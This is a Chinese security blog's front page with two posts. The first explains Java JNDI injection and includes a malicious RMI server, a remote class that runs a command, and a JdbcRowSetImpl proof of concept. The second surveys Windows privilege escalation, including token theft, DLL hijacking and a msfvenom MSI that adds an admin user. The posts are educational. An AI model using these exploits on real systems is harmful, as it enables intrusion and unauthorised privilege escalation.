<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="D_infinite的小站">
<meta property="og:url" content="http://dinfinite.cn/index.html">
<meta property="og:site_name" content="D_infinite的小站">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="D_infinite的小站">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://dinfinite.cn/"/>





  <title>D_infinite的小站</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">D_infinite的小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">不积跬步，无以至千里。</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tag"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2020/05/09/深入理解JAVA中的JNDI注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/09/深入理解JAVA中的JNDI注入/" itemprop="url">深入理解JAVA中的JNDI注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-09T17:17:23+08:00">
                2020-05-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI?"></a>什么是JNDI?</h2><blockquote>
<p>简单来说，<code>JNDI</code> (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用<code>JNDI</code>在局域网上定位一台打印机，也可以用<code>JNDI</code>来定位数据库服务或一个远程Java对象。<code>JNDI</code>底层支持<code>RMI</code>远程对象，<code>RMI</code>注册的服务可以通过JNDI接口来访问和调用。</p>
<p><code>JNDI</code>支持多种命名和目录提供程序（Naming and Directory Providers），<code>RMI</code>注册表服务提供程序（RMI Registry Service Provider）允许通过<code>JNDI</code>应用接口对<code>RMI</code>中注册的远程对象进行访问操作。将<code>RMI</code>服务绑定到<code>JNDI</code>的一个好处是更加透明、统一和松散耦合，<code>RMI</code>客户端直接通过URL来定位一个远程对象，而且该<code>RMI</code>服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p>
</blockquote>
<img src="/2020/05/09/深入理解JAVA中的JNDI注入/1.png" alt="1.png" title="">
<p>就个人的理解，<code>JNDI</code>相当于在<code>LDAP</code> <code>RMI</code>等服务外面再套了一层<code>API</code>，方便统一调用。</p>
<h2 id="JNDI的注入点"><a href="#JNDI的注入点" class="headerlink" title="JNDI的注入点"></a>JNDI的注入点</h2><p>假设client端地址为<code>10.0.0.1</code>，先来看下面一段，JNDI的client端的代码<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Context</span> <span class="built_in">context</span> = new  InitialContext()<span class="comment">;</span></div><div class="line"><span class="built_in">context</span>.lookup(providerURL)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>其中<code>providerURL</code>为可控变量，此时，可以传入任意JNDI服务路径来实现注入，如<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?providerURL=rmi:<span class="comment">//10.0.0.2:9527/evil</span></div></pre></td></tr></table></figure></p>
<p>但是问题来了，此时即使执行了evil所绑定的类，依然是在<code>10.0.0.2</code>上执行，无法影响到<code>10.0.0.1</code>，因此要引入一个新的概念</p>
<h2 id="JNDI-References"><a href="#JNDI-References" class="headerlink" title="JNDI References"></a>JNDI References</h2><blockquote>
<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
</blockquote>
<p>通过查阅References的源码，可以得知，其主要记录了如下信息<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> className;</div><div class="line"><span class="keyword">protected</span> Vector&lt;RefAddr&gt; addrs = <span class="built_in">null</span>;</div><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> classFactory = <span class="built_in">null</span>;</div><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> classFactoryLocation = <span class="built_in">null</span>;</div></pre></td></tr></table></figure></p>
<p>其中<code>classFactoryLocation</code>实际上是<code>LDAP</code>或者<code>RMI</code>的地址</p>
<h2 id="真正的JNDI注入"><a href="#真正的JNDI注入" class="headerlink" title="真正的JNDI注入"></a>真正的JNDI注入</h2><p>假设server地址为<code>10.0.0.2</code>，构造如下恶意<code>RMI</code>服务代码<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">9527</span>);</div><div class="line">Reference <span class="built_in">exec</span> = <span class="keyword">new</span> Reference(<span class="string">"Exec"</span>, <span class="string">"Exec"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</div><div class="line">ReferenceWrapper refWrap = <span class="keyword">new</span> ReferenceWrapper(<span class="built_in">exec</span>);</div><div class="line"><span class="keyword">System</span>.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:9527/exec"</span>);</div><div class="line">registry.bind(<span class="string">"exec"</span>, refWrap);</div></pre></td></tr></table></figure></p>
<p>上述代码非常简单，主要是将<code>/exec</code>这个路径绑定到一个<code>Reference</code>上，而这个<code>Reference</code>指向<code>127.0.0.1:8080/Exec.class</code>,其中<code>Reference</code>的构造函数第一个参数是<code>className</code>,第二个参数是<code>classFactory</code></p>
<p>紧接着让我们构造<code>Exec</code>这个恶意类<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.InputStreamReader;</div><div class="line"><span class="keyword">import</span> java.io.OutputStream;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exec &#123;</div><div class="line">    <span class="keyword">public</span> Exec() throws Exception&#123;</div><div class="line">        <span class="keyword">String</span> cmd = <span class="string">"whoami"</span>;</div><div class="line">        <span class="built_in">Process</span> p = Runtime.getRuntime().exec(cmd);</div><div class="line">        InputStream is = p.getInputStream();</div><div class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line"></div><div class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</div><div class="line">        <span class="keyword">int</span> a = <span class="number">-1</span>;</div><div class="line">        <span class="built_in">while</span> ((a = is.<span class="built_in">read</span>(b)) != <span class="number">-1</span>)&#123;</div><div class="line">            baos.<span class="built_in">write</span>(b, <span class="number">0</span>, a);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="keyword">new</span> <span class="keyword">String</span>(baos.toByteArray()));</div><div class="line"></div><div class="line">        p.waitFor();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>将其编译为<code>Exec.class</code>文件，然后拷贝到web目录下<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">javac</span> <span class="selector-tag">Exec</span><span class="selector-class">.java</span></div></pre></td></tr></table></figure></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp Exec.<span class="keyword">class</span> <span class="regexp">/var/</span>www<span class="regexp">/html/</span></div></pre></td></tr></table></figure>
<p>假设client地址为<code>10.0.0.1</code>，构造如下漏洞代码<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">System.setProperty(<span class="string">"java.rmi.server.useCodebaseOnly"</span>, <span class="string">"false"</span>)<span class="comment">;</span></div><div class="line">System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>)<span class="comment">;</span></div><div class="line"><span class="built_in">Context</span> <span class="built_in">context</span> = new  InitialContext()<span class="comment">;</span></div><div class="line"><span class="built_in">context</span>.lookup(<span class="string">"rmi://127.0.0.1/exec"</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>即可成功执行<code>whoami</code>命令<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/2.png" alt="2.png" title=""><br>其中前两行代码主要用于解除安全限制</p>
<blockquote>
<p>在RMI服务中引用远程对象将受本地Java环境限制即本地的java.rmi.server.useCodebaseOnly配置必须为false(允许加载远程对象)，如果该值为true则禁止引用远程对象。除此之外被引用的ObjectFactory对象还将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，如果该值为false(不信任远程引用对象)一样无法调用远程的引用对象。</p>
<p>JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p>
<p>JDK 6u132, JDK 7u122, JDK 8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。</p>
</blockquote>
<h2 id="深入源码探索"><a href="#深入源码探索" class="headerlink" title="深入源码探索"></a>深入源码探索</h2><p>前面提到了，实际原因是触发了object factory，下面我们来看一下具体的触发调用链<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/3.png" alt="3.png" title=""><br>核心代码触发代码从<code>decodeObject</code>开始<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">var1</span>为传入的remote接口对象</div><div class="line">Object var3 = <span class="built_in">var1</span> instanceof RemoteReference ? ((RemoteReference)<span class="built_in">var1</span>).getReference() : <span class="built_in">var1</span>;</div></pre></td></tr></table></figure></p>
<p>在<code>decodeObject</code>中，会判断传入对象是满足<code>RemoteReference</code>接口，满足则通过<code>getReference</code>函数获取<code>reference</code>对象，然后进入<code>getObjectInstance</code>函数<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">ref</span> != <span class="literal">null</span>) &#123;</div><div class="line">            String f = <span class="keyword">ref</span>.getFactoryClassName();</div><div class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</div><div class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></div><div class="line"></div><div class="line">                factory = getObjectFactoryFromReference(<span class="keyword">ref</span>, f); <span class="comment">//触发点1</span></div><div class="line">                <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</div><div class="line">                    <span class="keyword">return</span> factory.getObjectInstance(<span class="keyword">ref</span>, name, nameCtx,</div><div class="line">                                                     environment); <span class="comment">//触发点2</span></div><div class="line">                &#125;</div><div class="line">                <span class="comment">// No factory found, so return original refInfo.</span></div><div class="line">                <span class="comment">// Will reach this point if factory class is not in</span></div><div class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></div><div class="line">                <span class="keyword">return</span> refInfo;</div></pre></td></tr></table></figure></p>
<p>在<code>getObjectInstance</code>函数中，一共有两处可执行<code>RMI</code>中定义的恶意代码的地方，一处是<code>getObjectFactoryFromReference</code>，在<code>getObjectFactoryFromReference</code>中会通过获取到对应的<code>Class</code>对象，通过<code>clas.newInstance()</code>触发恶意构造函数<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> (clas != null) ? (ObjectFactory) clas.newInstance() : <span class="keyword"><span class="keyword">null</span></span>;</div></pre></td></tr></table></figure></p>
<p>另外一处，则是通过实例化的类，调用其<code>getObjectInstance</code>函数，只要我们实现了<code>ObjectFactory</code>接口，复写<code>getObjectInstance</code>函数，即可执行恶意代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exec</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exec</span><span class="params">()</span></span>&#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        System.out.println(<span class="string">"factory.getObjectInstance hook!"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="JdbcRowSetImpl的JNDI注入利用链"><a href="#JdbcRowSetImpl的JNDI注入利用链" class="headerlink" title="JdbcRowSetImpl的JNDI注入利用链"></a>JdbcRowSetImpl的JNDI注入利用链</h2><p>在实战过程中，<code>context.lookup</code>直接被外部调用的情况比较少，但是我们可以通过间接调用<code>context.lookup</code>实现JNDI的注入，<code>JdbcRowSetImpl</code>就是这样一条利用链，先来看一下最终的POC<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>)<span class="comment">;</span></div><div class="line"><span class="keyword">JdbcRowSetImpl </span><span class="keyword">j </span>= new <span class="keyword">JdbcRowSetImpl();</span></div><div class="line"><span class="keyword">j.setDataSourceName("rmi://127.0.0.1:9527/exec");</span></div><div class="line"><span class="keyword">j.setAutoCommit(true);</span></div></pre></td></tr></table></figure></p>
<p>调用链如下<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/4.png" alt="4.png" title=""><br>可以看到，唯一的不同在于<code>lookup</code>前调用了<code>setAutoCommit</code>以及<code>connect</code>方法</p>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>1.在POC复现的过程中，由于编译<code>Exec</code>使用了1.8，运行<code>Server</code>以及<code>Client</code>使用了1.7，导致无法运行。由于JAVA版本向下兼容，因此实际利用过程中，建议使用1.6编译<code>Exec.class</code>，笔者偷懒，均采用了1.8</p>
<p>2.<code>Exec</code>的声明不能带package，否则无法触发，具体原因仍未查明。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2020/03/16/Windows下常见提权方式/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/16/Windows下常见提权方式/" itemprop="url">Windows下常见提权方式</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-16T11:38:51+08:00">
                2020-03-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="服务路径"><a href="#服务路径" class="headerlink" title="服务路径"></a>服务路径</h2><p><a href="https://www.anquanke.com/post/id/85377" target="_blank" rel="external">漏洞复现</a><br>1.搜索存在问题路径<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service get name,displayname,pathname,startmode |<span class="type">findstr</span> /i <span class="string">"Auto"</span> |<span class="type">findstr</span> /i /v <span class="string">"C:\Windows\\"</span> |<span class="type">findstr</span> /i /v <span class="string">""</span><span class="string">"</span></div></pre></td></tr></table></figure></p>
<p>2.当存在空格时，会产生如下调用<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:<span class="string">\Vuln</span> Service<span class="string">\execute.exe</span></div><div class="line">C:<span class="string">\Vuln.exe</span></div></pre></td></tr></table></figure></p>
<p>原理为windows无法识别空格的含义，因此会进行程序搜索</p>
<p>3.编写恶意程序Vuln.exe，放入C:\下<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc <span class="literal">start</span> <span class="string">"Vuln Service"</span></div></pre></td></tr></table></figure></p>
<p>即可触发，但存在以下问题，自行添加的<a href="https://devops.osichina.net/2017/06/18/%E7%AC%AC2%E5%91%A8%20windows%E8%87%AA%E5%AE%9A%E4%B9%89%E7%A8%8B%E5%BA%8F%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/" target="_blank" rel="external">服务无法启动</a><br>实际利用过程中会有诸多限制，如目录的权限，服务无法自启动等，较为鸡肋</p>
<h2 id="令牌提权"><a href="#令牌提权" class="headerlink" title="令牌提权"></a>令牌提权</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="external">渗透技巧-Token窃取与利用</a></p>
<p>首先关于令牌的概述如下</p>
<ul>
<li>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录</li>
<li>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</li>
</ul>
<p>通过incognito这个工具，可以实现token的列举以及盗窃<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">incognito<span class="selector-class">.exe</span> list_tokens -u</div></pre></td></tr></table></figure></p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">incognito.exe<span class="built_in"> execute </span>-c <span class="string">"hacker/administrator"</span> cmd.exe</div></pre></td></tr></table></figure>
<p>在实际利用的过程中，会通过窃取令牌创建进程，以下为incognito的具体调用<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create_process(token_list[i].<span class="keyword">token</span>, <span class="keyword">command</span>, <span class="title">console_mode</span>, <span class="title">SecurityDelegation</span>);</div></pre></td></tr></table></figure></p>
<h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p><a href="https://www.freebuf.com/articles/78807.html" target="_blank" rel="external">DLL劫持科普</a></p>
<p><a href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/" target="_blank" rel="external">DLL劫持漏洞自动化识别工具Rattler测试</a></p>
<p>DLL劫持的核心原理在于DLL路径搜索，调用<code>LoadLibary</code>会从以下目录搜索DLL文件<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>程序所在目录。</div><div class="line"><span class="number">2.</span>加载 DLL 时所在的当前目录。</div><div class="line"><span class="number">3.</span>系统目录即 SYSTEM32 目录。</div><div class="line"><span class="number">4.16</span>位系统目录即 SYSTEM 目录。</div><div class="line"><span class="number">5.</span>Windows目录。</div><div class="line"><span class="number">6.</span>PATH环境变量中列出的目录</div></pre></td></tr></table></figure></p>
<p>比如<code>a.exe</code>加载了系统的<code>kernel32.dll</code>，如果在<code>a.exe</code>同级目录下生成恶意的<code>kernel32.dll</code>即可造成恶意利用，然而由于<code>kernel32.dll</code>在注册表<code>KnownDlls</code>中，无法利用</p>
<blockquote>
<p>微软为了更进一步的防御系统的DLL被劫持，将一些容易被劫持的系统DLL写进了一个注册表项中，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用</p>
</blockquote>
<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2><p>AlwaysInstallElevated是注册表配置<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[HKEY_CURRENT_USER<span class="symbol">\S</span>OFTWARE<span class="symbol">\P</span>olicies<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\I</span>nstaller]</div><div class="line">“AlwaysInstallElevated”=dword:00000001 </div><div class="line"></div><div class="line">[HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\P</span>olicies<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\I</span>nstaller]</div><div class="line">“AlwaysInstallElevated”=dword:00000001</div></pre></td></tr></table></figure></p>
<p>设置或开启该注册表后，允许普通用户以system权限安装msi，通过msf生成恶意msi</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">msfvenom -p windows/adduser <span class="attr">USER=superadmin</span> <span class="attr">PASS=supersuper</span> -f msi -o supper.msi</div></pre></td></tr></table></figure>
<p>通过在普通用户下执行该msi，可生成Administrator权限用户<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">msiexec <span class="regexp">/quiet /qn /i</span> <span class="keyword">super</span>.msi</div></pre></td></tr></table></figure></p>
<p>在实际利用过程中，该注册表项默认为0或不存在，因此较为鸡肋</p>
<h2 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h2><blockquote>
<p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。</p>
</blockquote>
<p>首先安装对应版本的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="external">ProcessMonitor</a><br>运行ProcessMonitor，打开某需要UAC认证的程序，通过filter过滤出进程的DLL文件访问情况</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Process <span class="keyword">Name</span> <span class="keyword">is</span> install.exe</div></pre></td></tr></table></figure>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Path <span class="keyword">contains</span> localdir</div></pre></td></tr></table></figure>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Result <span class="keyword">is</span> <span class="keyword">NAME</span> <span class="keyword">NOT</span> FOUND</div></pre></td></tr></table></figure>
<p>以上三个filter，可以发现程序中尝试在本地加载但是本地不存在的dll，通过在同级目录生成对应的dll文件，即可劫持。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2020/01/30/Linux应急响应排查/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
